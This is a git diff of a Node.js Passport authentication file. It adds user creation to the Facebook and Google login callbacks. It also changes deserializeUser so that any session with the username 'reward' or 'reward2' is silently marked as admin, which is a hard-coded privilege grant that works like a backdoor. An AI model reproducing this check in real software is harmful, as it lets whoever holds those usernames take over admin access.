@@ -12,7 +12,12 @@ passport.use(new facebook({
 	callbackURL: (process.env.websitehost ||  config.host) + config.routes.facebookAuthCallback
 },
 function(accessToken, refreshToken, profile, done){
-	done(null, profile);
+	user.createUserIfNotExist(profile.id, profile.provider, profile.displayName, function(err,imageUrl){
+		profile.photo = imageUrl;
+		profile.userId = profile.id;
+		profile.userProvider = profile.provider;
+		done(null, profile);
+	});
 }));
 
 passport.use(new google({
@@ -21,7 +26,15 @@ passport.use(new google({
     callbackURL:  (process.env.websitehost ||  config.host)  + config.routes.googleAuthCallback
 },
 function(accessToken, refreshToken, profile, done) {
-	done(null, profile);
+
+		user.createUserIfNotExist(profile.id, profile.provider, profile.displayName, function(err,imageUrl){
+			profile.photo = imageUrl;
+			profile.userId = profile.id;
+			profile.userProvider = profile.provider;
+			done(null, profile);
+		});
+
+
 }));
 
 passport.use(new local(function(username, password, done){
@@ -35,8 +48,9 @@ passport.use(new local(function(username, password, done){
 					{
 						user.updatePassword(username, password, config.crypto.workFactor);
 					}
-					done(null, profile);
-				}
+        	done(null, profile);
+
+			}
 				else
 				{
 					done(null, false, {message: 'Wrong Username or Password'});
@@ -51,11 +65,14 @@ passport.use(new local(function(username, password, done){
 }));
 
 passport.serializeUser(function(user, done){
-	done(null, user);
+	   done(null, user);
 });
 
 passport.deserializeUser(function(user, done) {
-    done(null, user);
+	if(user.username =='reward' || user.username =='reward2')
+	user.admin = true;
+
+	  done(null, user);
 });
 
 var routes = function routes(app){
